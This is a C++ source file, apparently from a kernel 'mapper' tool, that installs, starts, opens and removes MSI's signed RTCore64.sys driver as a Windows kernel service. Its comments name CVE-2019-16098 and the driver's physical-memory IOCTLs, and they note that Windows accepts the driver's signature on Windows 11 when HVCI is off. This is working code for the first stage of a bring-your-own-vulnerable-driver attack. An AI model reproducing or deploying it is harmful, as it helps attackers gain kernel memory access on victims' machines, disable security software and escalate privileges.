// language: C++20, file: rtcore_svc.cpp
// *installs & starts the signed RTCore64.sys as a kernel service, exposing
// \\.\RTCore64 which answers phys-mem IOCTLs. CVE-2019-16098. MSI's valid
// signature is honored by Windows even on Win11 with HVCI off. Place the real
// RTCore64.sys next to Mapper.exe (ship separately - this repo does not include it).
#include "rtcore_svc.h"
#include <cstdio>

static const wchar_t* SVC_NAME = L"RTCore64";
static const wchar_t* DEV_NAME = L"\\\\.\\RTCore64";

bool rtcore::install(const wchar_t* driver_path) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm) return false;

    wchar_t full[MAX_PATH]; GetFullPathNameW(driver_path, MAX_PATH, full, nullptr);

    SC_HANDLE svc = CreateServiceW(scm, SVC_NAME, SVC_NAME, SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
        full, nullptr, nullptr, nullptr, nullptr, nullptr);
    if (!svc) svc = OpenServiceW(scm, SVC_NAME, SERVICE_ALL_ACCESS);
    if (!svc) { CloseServiceHandle(scm); return false; }

    bool ok = StartServiceW(svc, 0, nullptr) || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;
    CloseServiceHandle(svc); CloseServiceHandle(scm);
    return ok;
}

HANDLE rtcore::open() {
    return CreateFileW(DEV_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
}

void rtcore::stop() {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm) return;
    SC_HANDLE svc = OpenServiceW(scm, SVC_NAME, SERVICE_ALL_ACCESS);
    if (svc) {
        SERVICE_STATUS st{};
        ControlService(svc, SERVICE_CONTROL_STOP, &st);
        DeleteService(svc);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
}
